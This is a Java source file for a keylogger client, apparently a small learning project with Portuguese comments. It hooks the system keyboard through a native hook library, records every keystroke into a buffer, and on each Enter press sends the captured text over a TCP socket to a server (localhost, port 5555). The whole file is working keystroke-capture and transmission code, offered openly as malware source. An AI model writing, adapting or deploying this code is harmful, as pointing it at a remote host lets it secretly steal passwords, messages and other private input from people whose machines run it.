package ClienteAppKeylogger;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.Writer;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Date;

import javax.annotation.processing.FilerException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class Main implements NativeKeyListener {
	
	
    
	
	static StringBuilder sb = new StringBuilder();
	
    
	
	 public void nativeKeyPressed(NativeKeyEvent arg0) {
		 
		 if( arg0.getKeyCode() == NativeKeyEvent.VC_SPACE) {
			 sb.append(" ");
		 }else if(arg0.getKeyCode() == NativeKeyEvent.VC_ENTER) {
			 System.out.println("enviando arquivo!!!");
			 Main.cliente("localhost", 5555);
			 System.out.println("Arquivo enviado!!"); 
		 }else if(arg0.getKeyCode() == NativeKeyEvent.VC_BACKSPACE) {
			 sb.append("backspace"); 
		 }
		 
		 
		 
			
		   
    }
	 
	 
	 

    public void nativeKeyReleased(NativeKeyEvent arg0) {
       
	   
   	 
    }

    public void nativeKeyTyped(NativeKeyEvent arg0) {
    	sb.append(arg0.getKeyChar()); 
    }
    


    
	
	//iniciar o keylogger
	public static void iniciarKeylooger() {
		try {
			
              GlobalScreen.registerNativeHook();
			
        }
        catch (NativeHookException ex) {
            System.err.println("Ops, ocorreu um problema ao tentar registrar o NativeHook");
            System.err.println(ex.getMessage());

            System.exit(1);
        }
		 
          GlobalScreen.getInstance().addNativeKeyListener(new Main());
	     
	}
	
	
	


	//cliente tcp
	public static void cliente(String host, int porta) {
		try {
			Socket socket;
			socket = new Socket(host, porta);
			
			 ObjectOutputStream saida = new ObjectOutputStream(socket.getOutputStream());
			 ObjectInputStream entrada = new ObjectInputStream(socket.getInputStream());
			 System.out.println("Enviando Mensagem.....");
			 String msg = sb.toString();
			 saida.writeUTF(msg);
			 saida.flush();
			 
			 System.out.println("Mensagem "  + msg + "Enviada!!");
			 
			 msg = entrada.readUTF();
			 System.out.println("Resposta" + msg);
			 
			 entrada.close();
			 saida.close();
			 socket.close();
			 
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	

	
	public static void main(String[] args) {
		
	 
		 Main.iniciarKeylooger();
		
	  
    }
}

